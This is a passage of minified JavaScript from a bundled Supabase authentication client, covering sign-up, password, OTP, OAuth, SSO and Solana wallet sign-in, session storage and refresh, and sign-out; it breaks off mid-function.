Ee(this.fetch,"GET",`${this.url}/admin/users/${n.userId}/factors`,{headers:this.headers,xform:o=>({data:{factors:o},error:null})});return{data:s,error:i}}catch(s){if(Fe(s))return{data:null,error:s};throw s}}async _deleteFactor(n){jn(n.userId),jn(n.id);try{return{data:await Ee(this.fetch,"DELETE",`${this.url}/admin/users/${n.userId}/factors/${n.id}`,{headers:this.headers}),error:null}}catch(s){if(Fe(s))return{data:null,error:s};throw s}}}function mm(a={}){return{getItem:n=>a[n]||null,setItem:(n,s)=>{a[n]=s},removeItem:n=>{delete a[n]}}}function dv(){if(typeof globalThis!="object")try{Object.defineProperty(Object.prototype,"__magic__",{get:function(){return this},configurable:!0}),__magic__.globalThis=__magic__,delete Object.prototype.__magic__}catch{typeof self<"u"&&(self.globalThis=self)}}const Nn={debug:!!(globalThis&&u0()&&globalThis.localStorage&&globalThis.localStorage.getItem("supabase.gotrue-js.locks.debug")==="true")};class f0 extends Error{constructor(n){super(n),this.isAcquireTimeout=!0}}class uv extends f0{}async function hv(a,n,s){Nn.debug&&console.log("@supabase/gotrue-js: navigatorLock: acquire lock",a,n);const i=new globalThis.AbortController;return n>0&&setTimeout(()=>{i.abort(),Nn.debug&&console.log("@supabase/gotrue-js: navigatorLock acquire timed out",a)},n),await Promise.resolve().then(()=>globalThis.navigator.locks.request(a,n===0?{mode:"exclusive",ifAvailable:!0}:{mode:"exclusive",signal:i.signal},async o=>{if(o){Nn.debug&&console.log("@supabase/gotrue-js: navigatorLock: acquired",a,o.name);try{return await s()}finally{Nn.debug&&console.log("@supabase/gotrue-js: navigatorLock: released",a,o.name)}}else{if(n===0)throw Nn.debug&&console.log("@supabase/gotrue-js: navigatorLock: not immediately available",a),new uv(`Acquiring an exclusive Navigator LockManager lock "${a}" immediately failed`);if(Nn.debug)try{const c=await globalThis.navigator.locks.query();console.log("@supabase/gotrue-js: Navigator LockManager state",JSON.stringify(c,null,"  "))}catch(c){console.warn("@supabase/gotrue-js: Error when querying Navigator LockManager state",c)}return console.warn("@supabase/gotrue-js: Navigator LockManager returned a null lock when using #request without ifAvailable set to true, it appears this browser is not following the LockManager spec https://developer.mozilla.org/en-US/docs/Web/API/LockManager/request"),await s()}}))}dv();const fv={url:Nb,storageKey:kb,autoRefreshToken:!0,persistSession:!0,detectSessionInUrl:!0,headers:Fb,flowType:"implicit",debug:!1,hasCustomAuthorizationHeader:!1};async function pm(a,n,s){return await s()}const kn={};class Da{constructor(n){var s,i;this.userStorage=null,this.memoryStorage=null,this.stateChangeEmitters=new Map,this.autoRefreshTicker=null,this.visibilityChangedCallback=null,this.refreshingDeferred=null,this.initializePromise=null,this.detectSessionInUrl=!0,this.hasCustomAuthorizationHeader=!1,this.suppressGetSessionWarning=!1,this.lockAcquired=!1,this.pendingInLock=[],this.broadcastChannel=null,this.logger=console.log,this.instanceID=Da.nextInstanceID,Da.nextInstanceID+=1,this.instanceID>0&&ar()&&console.warn("Multiple GoTrueClient instances detected in the same browser context. It is not an error, but this should be avoided as it may produce undefined behavior when used concurrently under the same storage key.");const o=Object.assign(Object.assign({},fv),n);if(this.logDebugMessages=!!o.debug,typeof o.debug=="function"&&(this.logger=o.debug),this.persistSession=o.persistSession,this.storageKey=o.storageKey,this.autoRefreshToken=o.autoRefreshToken,this.admin=new cv({url:o.url,headers:o.headers,fetch:o.fetch}),this.url=o.url,this.headers=o.headers,this.fetch=h0(o.fetch),this.lock=o.lock||pm,this.detectSessionInUrl=o.detectSessionInUrl,this.flowType=o.flowType,this.hasCustomAuthorizationHeader=o.hasCustomAuthorizationHeader,o.lock?this.lock=o.lock:ar()&&(!((s=globalThis?.navigator)===null||s===void 0)&&s.locks)?this.lock=hv:this.lock=pm,this.jwks||(this.jwks={keys:[]},this.jwks_cached_at=Number.MIN_SAFE_INTEGER),this.mfa={verify:this._verify.bind(this),enroll:this._enroll.bind(this),unenroll:this._unenroll.bind(this),challenge:this._challenge.bind(this),listFactors:this._listFactors.bind(this),challengeAndVerify:this._challengeAndVerify.bind(this),getAuthenticatorAssuranceLevel:this._getAuthenticatorAssuranceLevel.bind(this)},this.persistSession?(o.storage?this.storage=o.storage:u0()?this.storage=globalThis.localStorage:(this.memoryStorage={},this.storage=mm(this.memoryStorage)),o.userStorage&&(this.userStorage=o.userStorage)):(this.memoryStorage={},this.storage=mm(this.memoryStorage)),ar()&&globalThis.BroadcastChannel&&this.persistSession&&this.storageKey){try{this.broadcastChannel=new globalThis.BroadcastChannel(this.storageKey)}catch(c){console.error("Failed to create a new BroadcastChannel, multi-tab state changes will not be available",c)}(i=this.broadcastChannel)===null||i===void 0||i.addEventListener("message",async c=>{this._debug("received broadcast notification from other tab or client",c),await this._notifyAllSubscribers(c.data.event,c.data.session,!1)})}this.initialize()}get jwks(){var n,s;return(s=(n=kn[this.storageKey])===null||n===void 0?void 0:n.jwks)!==null&&s!==void 0?s:{keys:[]}}set jwks(n){kn[this.storageKey]=Object.assign(Object.assign({},kn[this.storageKey]),{jwks:n})}get jwks_cached_at(){var n,s;return(s=(n=kn[this.storageKey])===null||n===void 0?void 0:n.cachedAt)!==null&&s!==void 0?s:Number.MIN_SAFE_INTEGER}set jwks_cached_at(n){kn[this.storageKey]=Object.assign(Object.assign({},kn[this.storageKey]),{cachedAt:n})}_debug(...n){return this.logDebugMessages&&this.logger(`GoTrueClient@${this.instanceID} (${o0}) ${new Date().toISOString()}`,...n),this}async initialize(){return this.initializePromise?await this.initializePromise:(this.initializePromise=(async()=>await this._acquireLock(-1,async()=>await this._initialize()))(),await this.initializePromise)}async _initialize(){var n;try{const s=Ub(window.location.href);let i="none";if(this._isImplicitGrantCallback(s)?i="implicit":await this._isPKCECallback(s)&&(i="pkce"),ar()&&this.detectSessionInUrl&&i!=="none"){const{data:o,error:c}=await this._getSessionFromURL(s,i);if(c){if(this._debug("#_initialize()","error detecting session from URL",c),Tb(c)){const f=(n=c.details)===null||n===void 0?void 0:n.code;if(f==="identity_already_exists"||f==="identity_not_found"||f==="single_identity_not_deletable")return{error:c}}return await this._removeSession(),{error:c}}const{session:d,redirectType:m}=o;return this._debug("#_initialize()","detected session in URL",d,"redirect type",m),await this._saveSession(d),setTimeout(async()=>{m==="recovery"?await this._notifyAllSubscribers("PASSWORD_RECOVERY",d):await this._notifyAllSubscribers("SIGNED_IN",d)},0),{error:null}}return await this._recoverAndRefresh(),{error:null}}catch(s){return Fe(s)?{error:s}:{error:new c0("Unexpected error during initialization",s)}}finally{await this._handleVisibilityChange(),this._debug("#_initialize()","end")}}async signInAnonymously(n){var s,i,o;try{const c=await Ee(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,body:{data:(i=(s=n?.options)===null||s===void 0?void 0:s.data)!==null&&i!==void 0?i:{},gotrue_meta_security:{captcha_token:(o=n?.options)===null||o===void 0?void 0:o.captchaToken}},xform:Cr}),{data:d,error:m}=c;if(m||!d)return{data:{user:null,session:null},error:m};const f=d.session,x=d.user;return d.session&&(await this._saveSession(d.session),await this._notifyAllSubscribers("SIGNED_IN",f)),{data:{user:x,session:f},error:null}}catch(c){if(Fe(c))return{data:{user:null,session:null},error:c};throw c}}async signUp(n){var s,i,o;try{let c;if("email"in n){const{email:p,password:b,options:w}=n;let j=null,N=null;this.flowType==="pkce"&&([j,N]=await wn(this.storage,this.storageKey)),c=await Ee(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,redirectTo:w?.emailRedirectTo,body:{email:p,password:b,data:(s=w?.data)!==null&&s!==void 0?s:{},gotrue_meta_security:{captcha_token:w?.captchaToken},code_challenge:j,code_challenge_method:N},xform:Cr})}else if("phone"in n){const{phone:p,password:b,options:w}=n;c=await Ee(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,body:{phone:p,password:b,data:(i=w?.data)!==null&&i!==void 0?i:{},channel:(o=w?.channel)!==null&&o!==void 0?o:"sms",gotrue_meta_security:{captcha_token:w?.captchaToken}},xform:Cr})}else throw new io("You must provide either an email or phone number and a password");const{data:d,error:m}=c;if(m||!d)return{data:{user:null,session:null},error:m};const f=d.session,x=d.user;return d.session&&(await this._saveSession(d.session),await this._notifyAllSubscribers("SIGNED_IN",f)),{data:{user:x,session:f},error:null}}catch(c){if(Fe(c))return{data:{user:null,session:null},error:c};throw c}}async signInWithPassword(n){try{let s;if("email"in n){const{email:c,password:d,options:m}=n;s=await Ee(this.fetch,"POST",`${this.url}/token?grant_type=password`,{headers:this.headers,body:{email:c,password:d,gotrue_meta_security:{captcha_token:m?.captchaToken}},xform:fm})}else if("phone"in n){const{phone:c,password:d,options:m}=n;s=await Ee(this.fetch,"POST",`${this.url}/token?grant_type=password`,{headers:this.headers,body:{phone:c,password:d,gotrue_meta_security:{captcha_token:m?.captchaToken}},xform:fm})}else throw new io("You must provide either an email or phone number and a password");const{data:i,error:o}=s;return o?{data:{user:null,session:null},error:o}:!i||!i.session||!i.user?{data:{user:null,session:null},error:new ao}:(i.session&&(await this._saveSession(i.session),await this._notifyAllSubscribers("SIGNED_IN",i.session)),{data:Object.assign({user:i.user,session:i.session},i.weak_password?{weakPassword:i.weak_password}:null),error:o})}catch(s){if(Fe(s))return{data:{user:null,session:null},error:s};throw s}}async signInWithOAuth(n){var s,i,o,c;return await this._handleProviderSignIn(n.provider,{redirectTo:(s=n.options)===null||s===void 0?void 0:s.redirectTo,scopes:(i=n.options)===null||i===void 0?void 0:i.scopes,queryParams:(o=n.options)===null||o===void 0?void 0:o.queryParams,skipBrowserRedirect:(c=n.options)===null||c===void 0?void 0:c.skipBrowserRedirect})}async exchangeCodeForSession(n){return await this.initializePromise,this._acquireLock(-1,async()=>this._exchangeCodeForSession(n))}async signInWithWeb3(n){const{chain:s}=n;if(s==="solana")return await this.signInWithSolana(n);throw new Error(`@supabase/auth-js: Unsupported chain "${s}"`)}async signInWithSolana(n){var s,i,o,c,d,m,f,x,p,b,w,j;let N,k;if("message"in n)N=n.message,k=n.signature;else{const{chain:F,wallet:T,statement:R,options:S}=n;let U;if(ar())if(typeof T=="object")U=T;else{const H=window;if("solana"in H&&typeof H.solana=="object"&&("signIn"in H.solana&&typeof H.solana.signIn=="function"||"signMessage"in H.solana&&typeof H.solana.signMessage=="function"))U=H.solana;else throw new Error("@supabase/auth-js: No compatible Solana wallet interface on the window object (window.solana) detected. Make sure the user already has a wallet installed and connected for this app. Prefer passing the wallet interface object directly to signInWithWeb3({ chain: 'solana', wallet: resolvedUserWallet }) instead.")}else{if(typeof T!="object"||!S?.url)throw new Error("@supabase/auth-js: Both wallet and url must be specified in non-browser environments.");U=T}const z=new URL((s=S?.url)!==null&&s!==void 0?s:window.location.href);if("signIn"in U&&U.signIn){const H=await U.signIn(Object.assign(Object.assign(Object.assign({issuedAt:new Date().toISOString()},S?.signInWithSolana),{version:"1",domain:z.host,uri:z.href}),R?{statement:R}:null));let G;if(Array.isArray(H)&&H[0]&&typeof H[0]=="object")G=H[0];else if(H&&typeof H=="object"&&"signedMessage"in H&&"signature"in H)G=H;else throw new Error("@supabase/auth-js: Wallet method signIn() returned unrecognized value");if("signedMessage"in G&&"signature"in G&&(typeof G.signedMessage=="string"||G.signedMessage instanceof Uint8Array)&&G.signature instanceof Uint8Array)N=typeof G.signedMessage=="string"?G.signedMessage:new TextDecoder().decode(G.signedMessage),k=G.signature;else throw new Error("@supabase/auth-js: Wallet method signIn() API returned object without signedMessage and signature fields")}else{if(!("signMessage"in U)||typeof U.signMessage!="function"||!("publicKey"in U)||typeof U!="object"||!U.publicKey||!("toBase58"in U.publicKey)||typeof U.publicKey.toBase58!="function")throw new Error("@supabase/auth-js: Wallet does not have a compatible signMessage() and publicKey.toBase58() API");N=[`${z.host} wants you to sign in with your Solana account:`,U.publicKey.toBase58(),...R?["",R,""]:[""],"Version: 1",`URI: ${z.href}`,`Issued At: ${(o=(i=S?.signInWithSolana)===null||i===void 0?void 0:i.issuedAt)!==null&&o!==void 0?o:new Date().toISOString()}`,...!((c=S?.signInWithSolana)===null||c===void 0)&&c.notBefore?[`Not Before: ${S.signInWithSolana.notBefore}`]:[],...!((d=S?.signInWithSolana)===null||d===void 0)&&d.expirationTime?[`Expiration Time: ${S.signInWithSolana.expirationTime}`]:[],...!((m=S?.signInWithSolana)===null||m===void 0)&&m.chainId?[`Chain ID: ${S.signInWithSolana.chainId}`]:[],...!((f=S?.signInWithSolana)===null||f===void 0)&&f.nonce?[`Nonce: ${S.signInWithSolana.nonce}`]:[],...!((x=S?.signInWithSolana)===null||x===void 0)&&x.requestId?[`Request ID: ${S.signInWithSolana.requestId}`]:[],...!((b=(p=S?.signInWithSolana)===null||p===void 0?void 0:p.resources)===null||b===void 0)&&b.length?["Resources",...S.signInWithSolana.resources.map(G=>`- ${G}`)]:[]].join(`
`);const H=await U.signMessage(new TextEncoder().encode(N),"utf8");if(!H||!(H instanceof Uint8Array))throw new Error("@supabase/auth-js: Wallet signMessage() API returned an recognized value");k=H}}try{const{data:F,error:T}=await Ee(this.fetch,"POST",`${this.url}/token?grant_type=web3`,{headers:this.headers,body:Object.assign({chain:"solana",message:N,signature:Mb(k)},!((w=n.options)===null||w===void 0)&&w.captchaToken?{gotrue_meta_security:{captcha_token:(j=n.options)===null||j===void 0?void 0:j.captchaToken}}:null),xform:Cr});if(T)throw T;return!F||!F.session||!F.user?{data:{user:null,session:null},error:new ao}:(F.session&&(await this._saveSession(F.session),await this._notifyAllSubscribers("SIGNED_IN",F.session)),{data:Object.assign({},F),error:T})}catch(F){if(Fe(F))return{data:{user:null,session:null},error:F};throw F}}async _exchangeCodeForSession(n){const s=await Os(this.storage,`${this.storageKey}-code-verifier`),[i,o]=(s??"").split("/");try{const{data:c,error:d}=await Ee(this.fetch,"POST",`${this.url}/token?grant_type=pkce`,{headers:this.headers,body:{auth_code:n,code_verifier:i},xform:Cr});if(await as(this.storage,`${this.storageKey}-code-verifier`),d)throw d;return!c||!c.session||!c.user?{data:{user:null,session:null,redirectType:null},error:new ao}:(c.session&&(await this._saveSession(c.session),await this._notifyAllSubscribers("SIGNED_IN",c.session)),{data:Object.assign(Object.assign({},c),{redirectType:o??null}),error:d})}catch(c){if(Fe(c))return{data:{user:null,session:null,redirectType:null},error:c};throw c}}async signInWithIdToken(n){try{const{options:s,provider:i,token:o,access_token:c,nonce:d}=n,m=await Ee(this.fetch,"POST",`${this.url}/token?grant_type=id_token`,{headers:this.headers,body:{provider:i,id_token:o,access_token:c,nonce:d,gotrue_meta_security:{captcha_token:s?.captchaToken}},xform:Cr}),{data:f,error:x}=m;return x?{data:{user:null,session:null},error:x}:!f||!f.session||!f.user?{data:{user:null,session:null},error:new ao}:(f.session&&(await this._saveSession(f.session),await this._notifyAllSubscribers("SIGNED_IN",f.session)),{data:f,error:x})}catch(s){if(Fe(s))return{data:{user:null,session:null},error:s};throw s}}async signInWithOtp(n){var s,i,o,c,d;try{if("email"in n){const{email:m,options:f}=n;let x=null,p=null;this.flowType==="pkce"&&([x,p]=await wn(this.storage,this.storageKey));const{error:b}=await Ee(this.fetch,"POST",`${this.url}/otp`,{headers:this.headers,body:{email:m,data:(s=f?.data)!==null&&s!==void 0?s:{},create_user:(i=f?.shouldCreateUser)!==null&&i!==void 0?i:!0,gotrue_meta_security:{captcha_token:f?.captchaToken},code_challenge:x,code_challenge_method:p},redirectTo:f?.emailRedirectTo});return{data:{user:null,session:null},error:b}}if("phone"in n){const{phone:m,options:f}=n,{data:x,error:p}=await Ee(this.fetch,"POST",`${this.url}/otp`,{headers:this.headers,body:{phone:m,data:(o=f?.data)!==null&&o!==void 0?o:{},create_user:(c=f?.shouldCreateUser)!==null&&c!==void 0?c:!0,gotrue_meta_security:{captcha_token:f?.captchaToken},channel:(d=f?.channel)!==null&&d!==void 0?d:"sms"}});return{data:{user:null,session:null,messageId:x?.message_id},error:p}}throw new io("You must provide either an email or phone number.")}catch(m){if(Fe(m))return{data:{user:null,session:null},error:m};throw m}}async verifyOtp(n){var s,i;try{let o,c;"options"in n&&(o=(s=n.options)===null||s===void 0?void 0:s.redirectTo,c=(i=n.options)===null||i===void 0?void 0:i.captchaToken);const{data:d,error:m}=await Ee(this.fetch,"POST",`${this.url}/verify`,{headers:this.headers,body:Object.assign(Object.assign({},n),{gotrue_meta_security:{captcha_token:c}}),redirectTo:o,xform:Cr});if(m)throw m;if(!d)throw new Error("An error occurred on token verification.");const f=d.session,x=d.user;return f?.access_token&&(await this._saveSession(f),await this._notifyAllSubscribers(n.type=="recovery"?"PASSWORD_RECOVERY":"SIGNED_IN",f)),{data:{user:x,session:f},error:null}}catch(o){if(Fe(o))return{data:{user:null,session:null},error:o};throw o}}async signInWithSSO(n){var s,i,o;try{let c=null,d=null;return this.flowType==="pkce"&&([c,d]=await wn(this.storage,this.storageKey)),await Ee(this.fetch,"POST",`${this.url}/sso`,{body:Object.assign(Object.assign(Object.assign(Object.assign(Object.assign({},"providerId"in n?{provider_id:n.providerId}:null),"domain"in n?{domain:n.domain}:null),{redirect_to:(i=(s=n.options)===null||s===void 0?void 0:s.redirectTo)!==null&&i!==void 0?i:void 0}),!((o=n?.options)===null||o===void 0)&&o.captchaToken?{gotrue_meta_security:{captcha_token:n.options.captchaToken}}:null),{skip_http_redirect:!0,code_challenge:c,code_challenge_method:d}),headers:this.headers,xform:nv})}catch(c){if(Fe(c))return{data:null,error:c};throw c}}async reauthenticate(){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._reauthenticate())}async _reauthenticate(){try{return await this._useSession(async n=>{const{data:{session:s},error:i}=n;if(i)throw i;if(!s)throw new cs;const{error:o}=await Ee(this.fetch,"GET",`${this.url}/reauthenticate`,{headers:this.headers,jwt:s.access_token});return{data:{user:null,session:null},error:o}})}catch(n){if(Fe(n))return{data:{user:null,session:null},error:n};throw n}}async resend(n){try{const s=`${this.url}/resend`;if("email"in n){const{email:i,type:o,options:c}=n,{error:d}=await Ee(this.fetch,"POST",s,{headers:this.headers,body:{email:i,type:o,gotrue_meta_security:{captcha_token:c?.captchaToken}},redirectTo:c?.emailRedirectTo});return{data:{user:null,session:null},error:d}}else if("phone"in n){const{phone:i,type:o,options:c}=n,{data:d,error:m}=await Ee(this.fetch,"POST",s,{headers:this.headers,body:{phone:i,type:o,gotrue_meta_security:{captcha_token:c?.captchaToken}}});return{data:{user:null,session:null,messageId:d?.message_id},error:m}}throw new io("You must provide either an email or phone number and a type")}catch(s){if(Fe(s))return{data:{user:null,session:null},error:s};throw s}}async getSession(){return await this.initializePromise,await this._acquireLock(-1,async()=>this._useSession(async s=>s))}async _acquireLock(n,s){this._debug("#_acquireLock","begin",n);try{if(this.lockAcquired){const i=this.pendingInLock.length?this.pendingInLock[this.pendingInLock.length-1]:Promise.resolve(),o=(async()=>(await i,await s()))();return this.pendingInLock.push((async()=>{try{await o}catch{}})()),o}return await this.lock(`lock:${this.storageKey}`,n,async()=>{this._debug("#_acquireLock","lock acquired for storage key",this.storageKey);try{this.lockAcquired=!0;const i=s();for(this.pendingInLock.push((async()=>{try{await i}catch{}})()),await i;this.pendingInLock.length;){const o=[...this.pendingInLock];await Promise.all(o),this.pendingInLock.splice(0,o.length)}return await i}finally{this._debug("#_acquireLock","lock released for storage key",this.storageKey),this.lockAcquired=!1}})}finally{this._debug("#_acquireLock","end")}}async _useSession(n){this._debug("#_useSession","begin");try{const s=await this.__loadSession();return await n(s)}finally{this._debug("#_useSession","end")}}async __loadSession(){this._debug("#__loadSession()","begin"),this.lockAcquired||this._debug("#__loadSession()","used outside of an acquired lock!",new Error().stack);try{let n=null;const s=await Os(this.storage,this.storageKey);if(this._debug("#getSession()","session from storage",s),s!==null&&(this._isValidSession(s)?n=s:(this._debug("#getSession()","session from storage is not valid"),await this._removeSession())),!n)return{data:{session:null},error:null};const i=n.expires_at?n.expires_at*1e3-Date.now()<Ec:!1;if(this._debug("#__loadSession()",`session has${i?"":" not"} expired`,"expires_at",n.expires_at),!i){if(this.userStorage){const d=await Os(this.userStorage,this.storageKey+"-user");d?.user?n.user=d.user:n.user=Pc()}if(this.storage.isServer&&n.user){let d=this.suppressGetSessionWarning;n=new Proxy(n,{get:(f,x,p)=>(!d&&x==="user"&&(console.warn("Using the user object as returned from supabase.auth.getSession() or from some supabase.auth.onAuthStateChange() events could be insecure! This value comes directly from the storage medium (usually cookies on the server) and may not be authentic. Use supabase.auth.getUser() instead which authenticates the data by contacting the Supabase Auth server."),d=!0,this.suppressGetSessionWarning=!0),Reflect.get(f,x,p))})}return{data:{session:n},error:null}}const{session:o,error:c}=await this._callRefreshToken(n.refresh_token);return c?{data:{session:null},error:c}:{data:{session:o},error:null}}finally{this._debug("#__loadSession()","end")}}async getUser(n){return n?await this._getUser(n):(await this.initializePromise,await this._acquireLock(-1,async()=>await this._getUser()))}async _getUser(n){try{return n?await Ee(this.fetch,"GET",`${this.url}/user`,{headers:this.headers,jwt:n,xform:hs}):await this._useSession(async s=>{var i,o,c;const{data:d,error:m}=s;if(m)throw m;return!(!((i=d.session)===null||i===void 0)&&i.access_token)&&!this.hasCustomAuthorizationHeader?{data:{user:null},error:new cs}:await Ee(this.fetch,"GET",`${this.url}/user`,{headers:this.headers,jwt:(c=(o=d.session)===null||o===void 0?void 0:o.access_token)!==null&&c!==void 0?c:void 0,xform:hs})})}catch(s){if(Fe(s))return Cb(s)&&(await this._removeSession(),await as(this.storage,`${this.storageKey}-code-verifier`)),{data:{user:null},error:s};throw s}}async updateUser(n,s={}){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._updateUser(n,s))}async _updateUser(n,s={}){try{return await this._useSession(async i=>{const{data:o,error:c}=i;if(c)throw c;if(!o.session)throw new cs;const d=o.session;let m=null,f=null;this.flowType==="pkce"&&n.email!=null&&([m,f]=await wn(this.storage,this.storageKey));const{data:x,error:p}=await Ee(this.fetch,"PUT",`${this.url}/user`,{headers:this.headers,redirectTo:s?.emailRedirectTo,body:Object.assign(Object.assign({},n),{code_challenge:m,code_challenge_method:f}),jwt:d.access_token,xform:hs});if(p)throw p;return d.user=x.user,await this._saveSession(d),await this._notifyAllSubscribers("USER_UPDATED",d),{data:{user:d.user},error:null}})}catch(i){if(Fe(i))return{data:{user:null},error:i};throw i}}async setSession(n){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._setSession(n))}async _setSession(n){try{if(!n.access_token||!n.refresh_token)throw new cs;const s=Date.now()/1e3;let i=s,o=!0,c=null;const{payload:d}=Tc(n.access_token);if(d.exp&&(i=d.exp,o=i<=s),o){const{session:m,error:f}=await this._callRefreshToken(n.refresh_token);if(f)return{data:{user:null,session:null},error:f};if(!m)return{data:{user:null,session:null},error:null};c=m}else{const{data:m,error:f}=await this._getUser(n.access_token);if(f)throw f;c={access_token:n.access_token,refresh_token:n.refresh_token,user:m.user,token_type:"bearer",expires_in:i-s,expires_at:i},await this._saveSession(c),await this._notifyAllSubscribers("SIGNED_IN",c)}return{data:{user:c.user,session:c},error:null}}catch(s){if(Fe(s))return{data:{session:null,user:null},error:s};throw s}}async refreshSession(n){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._refreshSession(n))}async _refreshSession(n){try{return await this._useSession(async s=>{var i;if(!n){const{data:d,error:m}=s;if(m)throw m;n=(i=d.session)!==null&&i!==void 0?i:void 0}if(!n?.refresh_token)throw new cs;const{session:o,error:c}=await this._callRefreshToken(n.refresh_token);return c?{data:{user:null,session:null},error:c}:o?{data:{user:o.user,session:o},error:null}:{data:{user:null,session:null},error:null}})}catch(s){if(Fe(s))return{data:{user:null,session:null},error:s};throw s}}async _getSessionFromURL(n,s){try{if(!ar())throw new oo("No browser detected.");if(n.error||n.error_description||n.error_code)throw new oo(n.error_description||"Error in URL with unspecified error_description",{error:n.error||"unspecified_error",code:n.error_code||"unspecified_code"});switch(s){case"implicit":if(this.flowType==="pkce")throw new im("Not a valid PKCE flow url.");break;case"pkce":if(this.flowType==="implicit")throw new oo("Not a valid implicit grant flow url.");break;default:}if(s==="pkce"){if(this._debug("#_initialize()","begin","is PKCE flow",!0),!n.code)throw new im("No code detected.");const{data:R,error:S}=await this._exchangeCodeForSession(n.code);if(S)throw S;const U=new URL(window.location.href);return U.searchParams.delete("code"),window.history.replaceState(window.history.state,"",U.toString()),{data:{session:R.session,redirectType:null},error:null}}const{provider_token:i,provider_refresh_token:o,access_token:c,refresh_token:d,expires_in:m,expires_at:f,token_type:x}=n;if(!c||!m||!d||!x)throw new oo("No session defined in URL");const p=Math.round(Date.now()/1e3),b=parseInt(m);let w=p+b;f&&(w=parseInt(f));const j=w-p;j*1e3<=An&&console.warn(`@supabase/gotrue-js: Session as retrieved from URL expires in ${j}s, should have been closer to ${b}s`);const N=w-b;p-N>=120?console.warn("@supabase/gotrue-js: Session as retrieved from URL was issued over 120s ago, URL could be stale",N,w,p):p-N<0&&console.warn("@supabase/gotrue-js: Session as retrieved from URL was issued in the future? Check the device clock for skew",N,w,p);const{data:k,error:F}=await this._getUser(c);if(F)throw F;const T={provider_token:i,provider_refresh_token:o,access_token:c,expires_in:b,expires_at:w,refresh_token:d,token_type:x,user:k.user};return window.location.hash="",this._debug("#_getSessionFromURL()","clearing window.location.hash"),{data:{session:T,redirectType:n.type},error:null}}catch(i){if(Fe(i))return{data:{session:null,redirectType:null},error:i};throw i}}_isImplicitGrantCallback(n){return!!(n.access_token||n.error_description)}async _isPKCECallback(n){const s=await Os(this.storage,`${this.storageKey}-code-verifier`);return!!(n.code&&s)}async signOut(n={scope:"global"}){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._signOut(n))}async _signOut({scope:n}={scope:"global"}){return await this._useSession(async s=>{var i;const{data:o,error:c}=s;if(c)return{error:c};const d=(i=o.session)===null||i===void 0?void 0:i.access_token;if(d){const{error:m}=await this.admin.signOut(d,n);if(m&&!(Eb(m)&&(m.status===404||m.status===401||m.status===403)))return{error:m}}return n!=="others"&&(await this._removeSession(),await as(this.storage,`${this.storageKey}-code-verifier`)),{error:null}})}onAuthStateChange(n){const s=Bb(),i={id:s,callback:n,unsubscribe:()=>{this._debug("#unsubscribe()","state change callback with id removed",s),this.stateChangeEmitters.delete(s)}};return this._debug("#onAuthStateChange()","registered callback with id",s),this.stateChangeEmitters.set(s,i),(async()=>(await this.initializePromise,await this._acquireLock(-1,async()=>{this._emitInitialSession(s)})))(),{data:{subscription:i}}}async _emitInitialSession(n){return await this._useSession(async s=>{var i,o;try{const{data:{session:c},error:d}=s;if(d)throw d;await((i=this.stateChangeEmitters.get(n))===null||i===void 0?void 0:i.callback("INITIAL_SESSION",c)),this._debug("INITIAL_SESSION","callback id",n,"session",c)}catch(c){await((o=this.stateChangeEmitters.get(n))===null||o===void 0?void 0:o.callback("INITIAL_SESSION",null)),this._debug("INITIAL_SESSION","callback id",n,"error",c),console.error(c)}})}async resetPasswordForEmail(n,s={}){let i=null,o=null;this.flowType==="pkce"&&([i,o]=await wn(this.storage,this.storageKey,!0));try{return await Ee(this.fetch,"POST",`${this.url}/recover`,{body:{email:n,code_challenge:i,code_challenge_method:o,gotrue_meta_security:{captcha_token:s.captchaToken}},headers:this.headers,redirectTo:s.redirectTo})}catch(c){if(Fe(c))return{data:null,error:c};throw c}}async getUserIdentities(){var n;try{const{data:s,error:i}=await this.getUser();if(i)throw i;return{data:{identities:(n=s.user.identities)!==null&&n!==void 0?n:[]},error:null}}catch(s){if(Fe(s))return{data:null,error:s};throw s}}async linkIdentity(n){var s;try{const{data:i,error:o}=await this._useSession(async c=>{var d,m,f,x,p;const{data:b,error:w}=c;if(w)throw w;const j=await this._getUrlForProvider(`${this.url}/user/identities/authorize`,n.provider,{redirectTo:(d=n.options)===null||d===void 0?void 0:d.redirectTo,scopes:(m=n.options)===null||m===void 0?void 0:m.scopes,queryParams:(f=n.options)===null||f===void 0?void 0:f.queryParams,skipBrowserRedirect:!0});return await Ee(this.fetch,"GET",j,{headers:this.headers,jwt:(p=(x=b.session)===null||x===void 0?void 0:x.access_token)!==null&&p!==void 0?p:void 0})});if(o)throw o;return ar()&&!(!((s=n.options)===null||s===void 0)&&s.skipBrowserRedirect)&&window.location.assign(i?.url),{data:{provider:n.provider,url:i?.url},error:null}}catch(i){if(Fe(i))return{data:{provider:n.provider,url:null},error:i};throw i}}async unlinkIdentity(n){try{return await this._useSession(async s=>{var i,o;const{data:c,error:d}=s;if(d)throw d;return await Ee(this.fetch,"DELETE",`${this.url}/user/identities/${n.identity_id}`,{headers:this.headers,jwt:(o=(i=c.session)===null||i===void 0?void 0:i.access_token)!==null&&o!==void 0?o:void 0})})}catch(s){if(Fe(s))return{data:null,error:s};throw s}}async _refreshAccessToken(n){const s=`#_refreshAccessToken(${n.substring(0,5)}...)`;this._debug(s,"begin");try{const i=Date.now();return await Wb(async o=>(o>0&&await qb(200*Math.pow(2,o-1)),this._debug(s,"refreshing attempt",o),await Ee(this.fetch,"POST",`${this.url}/token?grant_type=refresh_token`,{body:{refresh_token:n},headers:this.headers,xform:Cr})),(o,c)=>{const d=200*Math.pow(2,o);return c&&Cc(c)&&Date.now()+d-i<An})}catch(i){if(this._debug(s,"error",i),Fe(i))return{data:{session:null,user:null},error:i};throw i}finally{this._debug(s,"end")}}_isValidSession(n){return typeof n=="object"&&n!==null&&"access_token"in n&&"refresh_token"in n&&"expires_at"in n}async _handleProviderSignIn(n,s){const i=await this._getUrlForProvider(`${this.url}/authorize`,n,{redirectTo:s.redirectTo,scopes:s.scopes,queryParams:s.queryParams});return this._debug("#_handleProviderSignIn()","provider",n,"options",s,"url",i),ar()&&!s.skipBrowserRedirect&&window.location.assign(i),{data:{provider:n,url:i},error:null}}async _recoverAndRefresh(){var n,s;const i="#_recoverAndRefresh()";this._debug(i,"begin");try{const o=await Os(this.storage,this.storageKey);if(o&&this.userStorage){let d=await 